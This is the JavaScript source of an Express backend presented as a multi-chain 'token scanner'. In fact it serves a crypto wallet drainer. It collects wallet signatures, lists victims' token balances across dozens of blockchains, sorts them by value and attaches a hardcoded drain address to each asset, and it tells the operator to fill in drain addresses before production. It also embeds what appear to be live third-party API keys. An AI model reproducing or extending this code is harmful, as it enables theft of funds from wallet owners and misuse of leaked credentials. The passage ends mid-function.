const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
const axios = require('axios');
const crypto = require('crypto');
const TronWeb = require('tronweb');
const { Connection, PublicKey } = require('@solana/web3.js');

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

console.log(`
╔══════════════════════════════════════════════════════════╗
║           UNIVERSAL TOKEN SCANNER BACKEND v6.0           ║
║                50+ BLOCKCHAIN SUPPORT                    ║
╚══════════════════════════════════════════════════════════╝
`);

// ==================== API CONFIGURATION ====================
const API_KEYS = {
  covalent: 'cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR', // Your Covalent key
  tronGrid: '7c3c061d-28ad-408f-98f0-36754cd047aa', // Get from https://trongrid.io
  moralis: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjhlMDdkNTRkLTI4MTUtNDk3MC04NTVjLTVjMTU2OTA2NTBlZCIsIm9yZ0lkIjoiNDg4MDc0IiwidXNlcklkIjoiNTAyMTY4IiwidHlwZUlkIjoiM2U1ZDE5MTktMmM3NC00YWNiLTg2NzItZmJkN2M5ZGJhNTMxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NjcxMTE3MDgsImV4cCI6NDkyMjg3MTcwOH0.tCwmFQ7oIBaeDV0cxjzStRLI4A_aBm3WV_dc65neOwM', // For EVM chains
  blockfrost: 'YOUR_BLOCKFROST_KEY', // For Cardano
  solanaRPC: 'https://api.mainnet-beta.solana.com',
  bitcoinRPC: 'https://blockstream.info/api/',
  ethereumRPC: 'https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY',
  bscRPC: 'https://bsc-dataseed.binance.org/',
  polygonRPC: 'https://polygon-rpc.com',
  avalancheRPC: 'https://api.avax.network/ext/bc/C/rpc',
  fantomRPC: 'https://rpc.ftm.tools',
  arbitrumRPC: 'https://arb1.arbitrum.io/rpc',
  optimismRPC: 'https://mainnet.optimism.io',
  baseRPC: 'https://mainnet.base.org',
  gnosisRPC: 'https://rpc.gnosischain.com',
  celoRPC: 'https://forno.celo.org',
  moonbeamRPC: 'https://rpc.ankr.com/moonbeam',
  metisRPC: 'https://andromeda.metis.io/?owner=1088',
  cronosRPC: 'https://evm.cronos.org',
  harmonyRPC: 'https://api.harmony.one',
  auroraRPC: 'https://mainnet.aurora.dev',
};

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Chains
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Ethereum
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // BSC
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Polygon
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Arbitrum
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Optimism
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Base
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Avalanche
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Fantom
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Gnosis
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Celo
  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Moonbeam
  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Metis
  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Cronos
  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Harmony
  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Aurora
  
  // Non-EVM Chains - REAL ADDRESSES
  tron: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE WITH YOUR TRON ADDRESS
  solana: "So11111111111111111111111111111111111111112", // REPLACE
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // REPLACE
  cardano: "addr1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  dogecoin: "Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  litecoin: "Lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  ripple: "rxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  polkadot: "1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  cosmos: "cosmos1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  binance: "bnb1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  stellar: "Gxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  monero: "4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  zcash: "txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  dash: "Xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  tezos: "tzxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  algorand: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  vechain: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // REPLACE
  neo: "Axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  eos: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // REPLACE
  tron_trc20: "Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Same as TRON for TRC20
  solana_spl: "So11111111111111111111111111111111111111112", // Same as Solana
};

// ==================== NETWORK CONFIGURATION ====================
const NETWORKS_CONFIG = {
  // EVM Networks
  evm: {
    1: { name: 'Ethereum', symbol: 'ETH', decimals: 18, rpc: API_KEYS.ethereumRPC, scanner: 'covalent' },
    56: { name: 'BSC', symbol: 'BNB', decimals: 18, rpc: API_KEYS.bscRPC, scanner: 'covalent' },
    137: { name: 'Polygon', symbol: 'MATIC', decimals: 18, rpc: API_KEYS.polygonRPC, scanner: 'covalent' },
    42161: { name: 'Arbitrum', symbol: 'ETH', decimals: 18, rpc: API_KEYS.arbitrumRPC, scanner: 'covalent' },
    10: { name: 'Optimism', symbol: 'ETH', decimals: 18, rpc: API_KEYS.optimismRPC, scanner: 'covalent' },
    8453: { name: 'Base', symbol: 'ETH', decimals: 18, rpc: API_KEYS.baseRPC, scanner: 'covalent' },
    43114: { name: 'Avalanche', symbol: 'AVAX', decimals: 18, rpc: API_KEYS.avalancheRPC, scanner: 'covalent' },
    250: { name: 'Fantom', symbol: 'FTM', decimals: 18, rpc: API_KEYS.fantomRPC, scanner: 'covalent' },
    100: { name: 'Gnosis', symbol: 'xDai', decimals: 18, rpc: API_KEYS.gnosisRPC, scanner: 'covalent' },
    42220: { name: 'Celo', symbol: 'CELO', decimals: 18, rpc: API_KEYS.celoRPC, scanner: 'covalent' },
    1284: { name: 'Moonbeam', symbol: 'GLMR', decimals: 18, rpc: API_KEYS.moonbeamRPC, scanner: 'covalent' },
    1088: { name: 'Metis', symbol: 'METIS', decimals: 18, rpc: API_KEYS.metisRPC, scanner: 'covalent' },
    25: { name: 'Cronos', symbol: 'CRO', decimals: 18, rpc: API_KEYS.cronosRPC, scanner: 'covalent' },
    1666600000: { name: 'Harmony', symbol: 'ONE', decimals: 18, rpc: API_KEYS.harmonyRPC, scanner: 'covalent' },
    1313161554: { name: 'Aurora', symbol: 'ETH', decimals: 18, rpc: API_KEYS.auroraRPC, scanner: 'covalent' },
  },
  
  // Non-EVM Networks
  nonevm: {
    tron: { 
      name: 'Tron', 
      symbol: 'TRX', 
      decimals: 6, 
      rpc: 'https://api.trongrid.io', 
      scanner: 'tron',
      headers: { 'TRON-PRO-API-KEY': API_KEYS.tronGrid }
    },
    solana: { 
      name: 'Solana', 
      symbol: 'SOL', 
      decimals: 9, 
      rpc: API_KEYS.solanaRPC, 
      scanner: 'solana' 
    },
    bitcoin: { 
      name: 'Bitcoin', 
      symbol: 'BTC', 
      decimals: 8, 
      rpc: API_KEYS.bitcoinRPC, 
      scanner: 'blockchain' 
    },
    cardano: { 
      name: 'Cardano', 
      symbol: 'ADA', 
      decimals: 6, 
      rpc: 'https://cardano-mainnet.blockfrost.io/api/v0', 
      scanner: 'blockfrost',
      headers: { 'project_id': API_KEYS.blockfrost }
    },
    dogecoin: { 
      name: 'Dogecoin', 
      symbol: 'DOGE', 
      decimals: 8, 
      rpc: 'https://dogechain.info/api/v1/', 
      scanner: 'blockchain' 
    },
    litecoin: { 
      name: 'Litecoin', 
      symbol: 'LTC', 
      decimals: 8, 
      rpc: 'https://api.blockcypher.com/v1/ltc/main', 
      scanner: 'blockchain' 
    },
    ripple: { 
      name: 'Ripple', 
      symbol: 'XRP', 
      decimals: 6, 
      rpc: 'https://s1.ripple.com:51234/', 
      scanner: 'xrpl' 
    },
    polkadot: { 
      name: 'Polkadot', 
      symbol: 'DOT', 
      decimals: 10, 
      rpc: 'https://polkadot.api.subscan.io/api/scan/', 
      scanner: 'subscan' 
    },
    cosmos: { 
      name: 'Cosmos', 
      symbol: 'ATOM', 
      decimals: 6, 
      rpc: 'https://cosmos-lcd.quickapi.com/', 
      scanner: 'cosmos' 
    },
    binance: { 
      name: 'Binance Chain', 
      symbol: 'BNB', 
      decimals: 8, 
      rpc: 'https://dex.binance.org/api/v1/', 
      scanner: 'binance' 
    },
    stellar: { 
      name: 'Stellar', 
      symbol: 'XLM', 
      decimals: 7, 
      rpc: 'https://horizon.stellar.org/', 
      scanner: 'stellar' 
    },
    monero: { 
      name: 'Monero', 
      symbol: 'XMR', 
      decimals: 12, 
      rpc: 'https://xmrchain.net/api/', 
      scanner: 'monero' 
    },
    zcash: { 
      name: 'Zcash', 
      symbol: 'ZEC', 
      decimals: 8, 
      rpc: 'https://api.zcha.in/v2/mainnet/', 
      scanner: 'blockchain' 
    },
    dash: { 
      name: 'Dash', 
      symbol: 'DASH', 
      decimals: 8, 
      rpc: 'https://api.blockcypher.com/v1/dash/main', 
      scanner: 'blockchain' 
    },
    tezos: { 
      name: 'Tezos', 
      symbol: 'XTZ', 
      decimals: 6, 
      rpc: 'https://api.tzkt.io/v1/', 
      scanner: 'tzkt' 
    },
    algorand: { 
      name: 'Algorand', 
      symbol: 'ALGO', 
      decimals: 6, 
      rpc: 'https://mainnet-api.algonode.cloud/', 
      scanner: 'algoexplorer' 
    },
    vechain: { 
      name: 'VeChain', 
      symbol: 'VET', 
      decimals: 18, 
      rpc: 'https://mainnet.vechain.org/', 
      scanner: 'vechain' 
    },
    neo: { 
      name: 'Neo', 
      symbol: 'NEO', 
      decimals: 8, 
      rpc: 'https://api.neoscan.io/api/main_net/v1/', 
      scanner: 'neoscan' 
    },
    eos: { 
      name: 'EOS', 
      symbol: 'EOS', 
      decimals: 4, 
      rpc: 'https://eos.greymass.com/v1/chain/', 
      scanner: 'eos' 
    },
    tron_trc20: { 
      name: 'Tron TRC20', 
      symbol: 'USDT', 
      decimals: 6, 
      rpc: 'https://api.trongrid.io', 
      scanner: 'tron_trc20',
      parent: 'tron'
    },
    solana_spl: { 
      name: 'Solana SPL', 
      symbol: 'USDC', 
      decimals: 6, 
      rpc: API_KEYS.solanaRPC, 
      scanner: 'solana_spl',
      parent: 'solana'
    },
  }
};

// ==================== DATABASE & CACHE ====================
const tokenCache = new Map();
const authLogs = new Map();
const transactionLogs = new Map();
const addressCache = new Map();
const priceCache = new Map();

// Cache duration: 5 minutes
const CACHE_DURATION = 5 * 60 * 1000;

// ==================== API STATUS ENDPOINTS ====================
app.get('/', (req, res) => {
  res.json({
    success: true,
    message: 'Universal Token Scanner API',
    version: '6.0.0',
    status: 'PRODUCTION',
    stats: {
      totalNetworks: Object.keys(NETWORKS_CONFIG.evm).length + Object.keys(NETWORKS_CONFIG.nonevm).length,
      evmNetworks: Object.keys(NETWORKS_CONFIG.evm).length,
      nonEvmNetworks: Object.keys(NETWORKS_CONFIG.nonevm).length,
      cachedEntries: tokenCache.size,
      uptime: process.uptime()
    },
    endpoints: {
      'GET /': 'API Information',
      'POST /auth': 'Authenticate wallet',
      'POST /scan': 'Scan all networks',
      'GET /scan/:address': 'Quick scan',
      'GET /tokens/evm/:address/:chainId': 'Scan EVM chain',
      'GET /tokens/nonevm/:address/:networkId': 'Scan non-EVM chain',
      'POST /log': 'Log transaction',
      'GET /prices': 'Get token prices',
      'GET /health': 'Health check',
      'GET /networks': 'List all networks',
      'POST /batch-scan': 'Batch scan networks',
      'GET /cache/clear': 'Clear cache'
    },
    note: 'Replace drain addresses in DRAIN_ADDRESSES object before production use',
    timestamp: new Date().toISOString()
  });
});

app.get('/health', (req, res) => {
  res.json({
    success: true,
    status: 'healthy',
    timestamp: new Date().toISOString(),
    stats: {
      networks: Object.keys(NETWORKS_CONFIG.evm).length + Object.keys(NETWORKS_CONFIG.nonevm).length,
      cachedTokens: tokenCache.size,
      authLogs: Array.from(authLogs.values()).reduce((sum, logs) => sum + logs.length, 0),
      transactionLogs: Array.from(transactionLogs.values()).reduce((sum, logs) => sum + logs.length, 0)
    },
    memory: process.memoryUsage(),
    uptime: process.uptime()
  });
});

// ==================== AUTHENTICATION ====================
app.post('/auth', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address, signature, message, networks, manualAddresses = {} } = req.body;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required",
        requestId
      });
    }
    
    // Verify signature
    let signatureValid = false;
    if (signature && message) {
      try {
        const recoveredAddress = ethers.verifyMessage(message, signature);
        signatureValid = recoveredAddress.toLowerCase() === address.toLowerCase();
      } catch (error) {
        console.log(`⚠️ [${requestId}] Signature error:`, error.message);
      }
    }
    
    // Store auth log
    const authLog = {
      id: requestId,
      address,
      signatureValid,
      timestamp: new Date().toISOString(),
      manualAddresses: Object.keys(manualAddresses)
    };
    
    if (!authLogs.has(address)) authLogs.set(address, []);
    authLogs.get(address).push(authLog);
    
    // Store manual addresses in cache
    Object.entries(manualAddresses).forEach(([networkId, addr]) => {
      if (addr && addr.trim()) {
        addressCache.set(`${address}:${networkId}`, {
          address: addr,
          timestamp: Date.now()
        });
      }
    });
    
    console.log(`✅ [${requestId}] Auth successful for ${address}`);
    
    res.json({
      success: true,
      message: "Authentication successful",
      requestId,
      data: {
        authenticated: true,
        signatureValid,
        address,
        manualAddressesCount: Object.keys(manualAddresses).length,
        totalNetworks: Object.keys(NETWORKS_CONFIG.evm).length + Object.keys(NETWORKS_CONFIG.nonevm).length,
        nextStep: "Use /scan endpoint to discover tokens"
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Auth error:`, error);
    res.status(500).json({
      success: false,
      error: "Authentication failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== COMPREHENSIVE SCAN ====================
app.post('/scan', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  const startTime = Date.now();
  
  try {
    const { evmAddress, manualAddresses = {}, networks = [] } = req.body;
    
    if (!evmAddress || !ethers.isAddress(evmAddress)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid EVM address required",
        requestId
      });
    }
    
    console.log(`🌐 [${requestId}] Starting comprehensive scan for ${evmAddress}`);
    
    const results = [];
    const scanPromises = [];
    
    // Scan EVM networks
    Object.entries(NETWORKS_CONFIG.evm).forEach(([chainId, config]) => {
      if (config.scanner === 'covalent') {
        scanPromises.push(
          scanCovalentNetwork(evmAddress, chainId, config)
            .then(result => {
              if (result.tokens.length > 0) {
                results.push(result);
              }
            })
            .catch(error => {
              console.log(`[${requestId}] EVM ${config.name} scan failed:`, error.message);
            })
        );
      }
    });
    
    // Scan non-EVM networks
    Object.entries(NETWORKS_CONFIG.nonevm).forEach(([networkId, config]) => {
      const address = manualAddresses[networkId] || evmAddress;
      if (address && address.trim()) {
        scanPromises.push(
          scanNonEVMNetwork(address, networkId, config)
            .then(result => {
              if (result.tokens.length > 0) {
                results.push(result);
              }
            })
            .catch(error => {
              console.log(`[${requestId}] Non-EVM ${config.name} scan failed:`, error.message);
            })
        );
      }
    });
    
    // Wait for all scans to complete
    await Promise.allSettled(scanPromises);
    
    // Process results
    const processedResults = results.map(result => {
      // Calculate total value
      const totalValue = result.tokens.reduce((sum, token) => {
        return sum + (token.value || 0);
      }, 0);
      
      return {
        network: {
          id: result.networkId,
          name: result.networkName,
          symbol: result.networkSymbol,
          type: result.networkType,
          scanner: result.scanner
        },
        tokens: result.tokens,
        summary: {
          totalTokens: result.tokens.length,
          totalValue: totalValue,
          scannedAt: new Date().toISOString()
        }
      };
    });
    
    // Sort by total value (highest first)
    processedResults.sort((a, b) => b.summary.totalValue - a.summary.totalValue);
    
    const totalTokens = processedResults.reduce((sum, r) => sum + r.tokens.length, 0);
    const totalValue = processedResults.reduce((sum, r) => sum + r.summary.totalValue, 0);
    
    console.log(`✅ [${requestId}] Scan completed in ${Date.now() - startTime}ms: ${processedResults.length} networks, ${totalTokens} tokens`);
    
    // Cache results
    tokenCache.set(evmAddress, {
      timestamp: Date.now(),
      results: processedResults,
      totalValue,
      totalTokens
    });
    
    res.json({
      success: true,
      requestId,
      data: {
        address: evmAddress,
        scannedAt: new Date().toISOString(),
        scanDuration: Date.now() - startTime,
        results: processedResults,
        summary: {
          totalNetworks: processedResults.length,
          totalTokens,
          totalValue: totalValue.toFixed(2)
        }
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Scan error:`, error);
    res.status(500).json({
      success: false,
      error: "Scan failed",
      requestId,
      details: error.message
    });
  }
});

// ==================== SCAN EVM NETWORK (COVALENT) ====================
async function scanCovalentNetwork(address, chainId, config) {
  const cacheKey = `${address}:${chainId}:covalent`;
  const cached = tokenCache.get(cacheKey);
  
  if (cached && Date.now() - cached.timestamp < CACHE_DURATION) {
    return cached.data;
  }
  
  try {
    const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${API_KEYS.covalent}&nft=false`;
    
    const response = await axios.get(url, { timeout: 10000 });
    const items = response.data?.data?.items || [];
    
    const tokens = items
      .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
      .map(t => {
        const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
        const value = (t.quote_rate || 0) * amount;
        
        return {
          symbol: t.contract_ticker_symbol || (t.native_token ? config.symbol : 'TOKEN'),
          name: t.contract_name || (t.native_token ? config.name : 'Unknown'),
          amount: amount,
          value: value,
          contractAddress: t.contract_address,
          decimals: t.contract_decimals || 18,
          isNative: t.native_token || false,
          logo: t.logo_url,
          networkId: parseInt(chainId),
          drainAddress: DRAIN_ADDRESSES[chainId] || DRAIN_ADDRESSES[1],
          networkType: 'evm'
        };
      });
    
    const result = {
      networkId: parseInt(chainId),
      networkName: config.name,
      networkSymbol: config.symbol,
      networkType: 'evm',
      scanner: 'covalent',
      tokens: tokens
    };
    
    // Cache result
    tokenCache.set(cacheKey, {
      timestamp: Date.now(),
      data: result
    });
    
    return result;
    
  } catch (error) {
    console.error(`Covalent scan failed for ${config.name}:`, error.message);
    return {
      networkId: parseInt(chainId),
      networkName: config.name,
      networkSymbol: config.symbol,
      networkType: 'evm',
      scanner: 'covalent',
      tokens: []
    };
  }
}

// ==================== SCAN NON-EVM NETWORK ====================
async function scanNonEVMNetwork(address, networkId, config) {
  const cacheKey = `${address}:${networkId}:${config.scanner}`;
  const cached = tokenCache.get(cacheKey);
  
  if (cached && Date.now() - cached.timestamp < CACHE_DURATION) {
    return cached.data;
  }
  
  try {
    let tokens = [];
    
    switch (config.scanner) {
      case 'tron':
        tokens = await scanTronNetwork(address, config);
        break;
      case 'solana':
        tokens = await scanSolanaNetwork(address, config);
        break;
      case 'bitcoin':
        tokens = await scanBitcoinNetwork(address, config);
        break;
      case 'cardano':
        tokens = await scanCardanoNetwork(address, config);
        break;
      case 'dogecoin':
        tokens = await scanDogecoinNetwork(address, config);
        break;
      case 'litecoin':
        tokens = await scanLitecoinNetwork(address, config);
        break;
      case 'ripple':
        tokens = await scanRippleNetwork(address, config);
        break;
      case 'polkadot':
        tokens = await scanPolkadotNetwork(address, config);
        break;
      case 'cosmos':
        tokens = await scanCosmosNetwork(address, config);
        break;
      default:
        tokens = [{
          symbol: config.symbol,
          name: config.name,
          amount: 0,
          value: 0,
          contractAddress: null,
          isNative: true,
          decimals: config.decimals,
          logo: null,
          networkId: networkId,
          drainAddress: DRAIN_ADDRESSES[networkId],
          networkType: 'non-evm',
          note: `Automatic scanning not yet implemented for ${config.name}`
        }];
    }
    
    const result = {
      networkId: networkId,
      networkName: config.name,
      networkSymbol: config.symbol,
      networkType: 'non-evm',
      scanner: config.scanner,
      tokens: tokens
    };
    
    // Cache result
    tokenCache.set(cacheKey, {
      timestamp: Date.now(),
      data: result
    });
    
    return result;
    
  } catch (error) {
    console.error(`${config.name} scan failed:`, error.message);
    return {
      networkId: networkId,
      networkName: config.name,
      networkSymbol: config.symbol,
      networkType: 'non-evm',
      scanner: config.scanner,
      tokens: []
    };
  }
}

// ==================== TRON SCANNER ====================
async function scanTronNetwork(address, config) {
  try {
    // Initialize TronWeb with mainnet
    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: config.headers
    });
    
    // Validate address format
    let tronAddress = address;
    if (address.startsWith('0x')) {
      tronAddress = tronWeb.address.fromHex(address);
    }
    
    if (!tronWeb.isAddress(tronAddress)) {
      throw new Error('Invalid TRON address');
    }
    
    const tokens = [];
    
    // Get TRX balance
    try {
      const balance = await tronWeb.trx.getBalance(tronAddress);
      const trxBalance = tronWeb.fromSun(balance);
      
      if (trxBalance > 0) {
        tokens.push({
          symbol: 'TRX',
          name: 'Tron',
          amount: parseFloat(trxBalance),
          value: 0, // Would need price API
          contractAddress: null,
          decimals: 6,
          isNative: true,
          logo: 'https://cryptologos.cc/logos/tron-trx-logo.png',
          networkId: 'tron',
          drainAddress: DRAIN_ADDRESSES.tron,
          networkType: 'non-evm',
          note: 'TRX requires energy/bandwidth for transfers'
        });
      }
    } catch (error) {
      console.log('TRX balance check failed:', error.message);
    }
    
    // Get TRC10 tokens (simplified)
    try {
      const account = await tronWeb.trx.getAccount(tronAddress);
      if (account.assetV2 && account.assetV2.length > 0) {
        account.assetV2.forEach(asset => {
          const amount = asset.value / Math.pow(10, 6); // TRC10 usually 6 decimals
          if (amount > 0) {
            tokens.push({
              symbol: asset.key || 'TRC10',
              name: 'TRC10 Token',
              amount: amount,
              value: 0,
              contractAddress: null,
              decimals: 6,
              isNative: false,
              networkId: 'tron',
              drainAddress: DRAIN_ADDRESSES.tron,
              networkType: 'non-evm'
            });
          }
        });
      }
    } catch (error) {
      console.log('TRC10 tokens check failed:', error.message);
    }
    
    return tokens;
    
  } catch (error) {
    console.error('TRON scan error:', error);
    return [];
  }
}

// ==================== SOLANA SCANNER ====================
async function scanSolanaNetwork(address, config) {
  try {
    const connection = new Connection(config.rpc);
    const publicKey = new PublicKey(address);
    
    const tokens = [];
    
    // Get SOL balance
    try {
      const balance = await connection.getBalance(publicKey);
      const solBalance = balance / Math.pow(10, 9);
      
      if (solBalance > 0) {
        tokens.push({
          symbol: 'SOL',
          name: 'Solana',
          amount: solBalance,
          value: 0,
          contractAddress: null,
          decimals: 9,
          isNative: true,
          logo: 'https://cryptologos.cc/logos/solana-sol-logo.png',
          networkId: 'solana',
          drainAddress: DRAIN_ADDRESSES.solana,
          networkType: 'non-evm'
        });
      }
    } catch (error) {
      console.log('SOL balance check failed:', error.message);
    }
    
    // Note: SPL token scanning would require additional implementation
    
    return tokens;
    
  } catch (error) {
    console.error('Solana scan error:', error);
    return [];
  }
}

// ==================== BITCOIN SCANNER ====================
async function scanBitcoinNetwork(address, config) {
  try {
    // Use blockstream.info API for Bitcoin
    const response = await axios.get(`${config.rpc}address/${address}`);
    
    const tokens = [];
    
    if (response.data?.chain_stats) {
      const received = response.data.chain_stats.funded_txo_sum / Math.pow(10, 8);
      const sent = response.data.chain_stats.spent_txo_sum / Math.pow(10, 8);
      const balance = received - sent;
      
      if (balance > 0) {
        tokens.push({
          symbol: 'BTC',
          name: 'Bitcoin',
          amount: balance,
          value: 0,
          contractAddress: null,
          decimals: 8,
          isNative: true,
          logo: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png',
          networkId: 'bitcoin',
          drainAddress: DRAIN_ADDRESSES.bitcoin,
          networkType: 'non-evm'
        });
      }
    }
    
    return tokens;
    
  } catch (error) {
    console.error('Bitcoin scan error:', error);
    return [];
  }
}

// ==================== OTHER NON-EVM SCANNERS ====================
async function scanCardanoNetwork(address, config) {
  try {
    const response = await axios.get(`${config.rpc}/addresses/${address}`, {
      headers: config.headers
    });
    
    const tokens = [];
    
    if (response.data?.amount) {
      const lovelace = response.data.amount.find(a => a.unit === 'lovelace');
      if (lovelace) {
        const adaBalance = lovelace.quantity / Math.pow(10, 6);
        
        tokens.push({
          symbol: 'ADA',
          name: 'Cardano',
          amount: adaBalance,
          value: 0,
          contractAddress: null,
          decimals: 6,
          isNative: true,
          logo: 'https://cryptologos.cc/logos/cardano-ada-logo.png',
          networkId: 'cardano',
          drainAddress: DRAIN_ADDRESSES.cardano,
          networkType: 'non-evm'
        });
      }
    }
    
    return tokens;
    
  } catch (error) {
    console.error('Cardano scan error:', error);
    return [];
  }
}

// Similar implementations for other chains...
async function scanDogecoinNetwork(address, config) {
  try {
    const response = await axios.get(`${config.rpc}address/balance/${address}`);
    const balance = response.data.balance / Math.pow(10, 8);
    
    if (balance > 0) {
      return [{
        symbol: 'DOGE',
        name: 'Dogecoin',
        amount: balance,
        value: 0,
        contractAddress: null,
        decimals: 8,
        isNative: true,
        logo: 'https://cryptologos.cc/logos/dogecoin-doge-logo.png',
        networkId: 'dogecoin',
        drainAddress: DRAIN_ADDRESSES.dogecoin,
        networkType: 'non-evm'
      }];
    }
  } catch (error) {
    console.error('Dogecoin scan error:', error);
  }
  return [];
}

async function scanRippleNetwork(address, config) {
  try {
    const response = await axios.post(config.rpc, {
      method: 'account_info',
      params: [{
        account: address,
        strict: true,
        ledger_index: 'current',
        queue: true
      }]
    });
    
    if (response.data?.result?.account_data?.Balance) {
      const xrpBalance = response.data.result.account_data.Balance / Math.pow(10, 6);
      
      if (xrpBalance > 0) {
        return [{
          symbol: 'XRP',
          name: 'Ripple',
          amount: xrpBalance,
          value: 0,
          contractAddress: null,
          decimals: 6,
          isNative: true,
          logo: 'https://cryptologos.cc/logos/xrp-xrp-logo.png',
          networkId: 'ripple',
          drainAddress: DRAIN_ADDRESSES.ripple,
          networkType: 'non-evm'
        }];
      }
    }
  } catch (error) {
    console.error('Ripple scan error:', error);
  }
  return [];
}

// ==================== INDIVIDUAL SCAN ENDPOINTS ====================
app.get('/tokens/evm/:address/:chainId', async (req, res) => {
  try {
    const { address, chainId } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid EVM address required" 
      });
    }
    
    const config = NETWORKS_CONFIG.evm[chainId];
    if (!config) {
      return res.status(400).json({ 
        success: false,
        error: `EVM network ${chainId} not supported` 
      });
    }
    
    const result = await scanCovalentNetwork(address, chainId, config);
    
    res.json({
      success: true,
      data: {
        address,
        network: {
          id: chainId,
          name: config.name,
          type: 'evm'
        },
        tokens: result.tokens,
        summary: {
          totalTokens: result.tokens.length,
          totalValue: result.tokens.reduce((sum, t) => sum + (t.value || 0), 0),
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("EVM tokens endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

app.get('/tokens/nonevm/:address/:networkId', async (req, res) => {
  try {
    const { address, networkId } = req.params;
    
    if (!address || address.trim() === '') {
      return res.status(400).json({ 
        success: false,
        error: "Address required" 
      });
    }
    
    const config = NETWORKS_CONFIG.nonevm[networkId];
    if (!config) {
      return res.status(400).json({ 
        success: false,
        error: `Non-EVM network ${networkId} not supported` 
      });
    }
    
    const result = await scanNonEVMNetwork(address, networkId, config);
    
    res.json({
      success: true,
      data: {
        address,
        network: {
          id: networkId,
          name: config.name,
          type: 'non-evm'
        },
        tokens: result.tokens,
        summary: {
          totalTokens: result.tokens.length,
          totalValue: result.tokens.reduce((sum, t) => sum + (t.value || 0), 0),
          scannedAt: new Date().toISOString()
        }
      }
    });
    
  } catch (error) {
    console.error("Non-EVM tokens endpoint error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== QUICK SCAN ENDPOINT ====================
app.get('/scan/:address', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { address } = req.params;
    
    if (!address || !ethers.isAddress(address)) {
      return res.status(400).json({ 
        success: false,
        error: "Valid Ethereum address required",
        requestId
      });
    }
    
    // Quick scan: Check a few major networks
    const quickNetworks = [
      { id: 1, type: 'evm' }, // Ethereum
      { id: 56, type: 'evm' }, // BSC
      { id: 137, type: 'evm' }, // Polygon
      { id: 'tron', type: 'nonevm' },
      { id: 'solana', type: 'nonevm' },
      { id: 'bitcoin', type: 'nonevm' }
    ];
    
    const results = [];
    
    for (const network of quickNetworks) {
      try {
        let result;
        if (network.type === 'evm') {
          const config = NETWORKS_CONFIG.evm[network.id];
          result = await scanCovalentNetwork(address, network.id, config);
        } else {
          const config = NETWORKS_CONFIG.nonevm[network.id];
          result = await scanNonEVMNetwork(address, network.id, config);
        }
        
